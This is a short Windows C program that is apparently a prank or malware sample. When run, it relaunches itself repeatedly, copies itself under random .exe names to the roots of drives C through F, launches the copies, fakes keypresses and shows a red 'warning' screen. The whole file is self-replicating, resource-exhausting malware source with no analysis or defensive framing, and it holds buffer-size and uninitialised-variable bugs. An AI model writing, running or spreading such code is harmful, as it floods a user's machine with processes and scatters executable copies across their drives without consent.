#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main()
{
    char myappname[128] = {0};
    GetModuleFileName(NULL,myappname,255);
    ShellExecute(NULL,"open",myappname,myappname,NULL,SW_SHOWNORMAL);
    ShellExecute(NULL,"open",myappname,myappname,NULL,SW_SHOWNORMAL);
    ShellExecute(NULL,"open",myappname,myappname,NULL,SW_SHOWNORMAL);
    ShellExecute(NULL,"open",myappname,myappname,NULL,SW_SHOWNORMAL);
    ShellExecute(NULL,"open",myappname,myappname,NULL,SW_SHOWNORMAL);

    char randed [16] = {0};
    char lastname [21] = {0};
    unsigned int i,I,L;
    srand((unsigned) time(NULL)+i+I+L);
    for(i=0;i<2;i++)
    {
        system("cls");
        system("COLOR FC");
        printf("\n\n\n\n\n\n                                   warning:\n\n%s\n\n",myappname);
        keybd_event(32,0,0,0);
        keybd_event(32,0,KEYEVENTF_KEYUP,0);
        keybd_event(13,0,0,0);
        keybd_event(13,0,KEYEVENTF_KEYUP,0);

        L=rand()%6+5;
        for(I=0;I<L;I++)randed[I]=((rand()%3)/2)?rand()%9+48:((rand()%2)?rand()%26+65:rand()%26+97);
        randed[I]='\0';
        strcat(randed,".exe");

        {
        strcpy(lastname,"c:\\");
        strcat(lastname,randed);
        CopyFile(myappname,lastname,0);
        ShellExecute(NULL,"open",lastname,lastname,NULL,SW_SHOWNORMAL);
        printf("                                %s\n\n",lastname);
        }

        {
        strcpy(lastname,"d:\\");
        strcat(lastname,randed);
        CopyFile(myappname,lastname,0);
        //ShellExecute(NULL,"open",lastname,lastname,NULL,SW_SHOWNORMAL);
        printf("                                %s\n\n",lastname);
        }

        {
        strcpy(lastname,"e:\\");
        strcat(lastname,randed);
        CopyFile(myappname,lastname,0);
        //ShellExecute(NULL,"open",lastname,lastname,NULL,SW_SHOWNORMAL);
        printf("                                %s\n\n",lastname);
        }

        {
        strcpy(lastname,"f:\\");
        strcat(lastname,randed);
        CopyFile(myappname,lastname,0);
        //ShellExecute(NULL,"open",lastname,lastname,NULL,SW_SHOWNORMAL);
        printf("                                %s\n\n",lastname);
        }
        printf("%d\n\n\n",i);
    }
    return 0;
}